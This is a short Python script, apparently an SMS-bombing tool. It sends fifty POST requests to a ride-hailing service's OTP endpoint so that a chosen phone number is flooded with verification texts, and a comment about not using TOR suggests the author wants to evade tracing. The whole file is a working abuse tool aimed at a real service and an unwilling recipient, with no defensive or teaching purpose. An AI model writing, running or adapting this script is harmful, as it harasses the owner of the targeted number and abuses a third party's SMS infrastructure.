# Warning this script is not using TOR for binding ro ip 

import requests
import time

phone_number = "+123456789" # replace with the phone number you want to target
num_requests = 50 # replace with the number of SMS messages you want to send

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
    "Content-Type": "application/json",
}

data = {
    "cellphone": phone_number,
}

for i in range(num_requests):
    response = requests.post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", headers=headers, json=data)
    print("SMS sent! Response:", response.json())
    time.sleep(1) # wait for 1 second before sending the next SMS
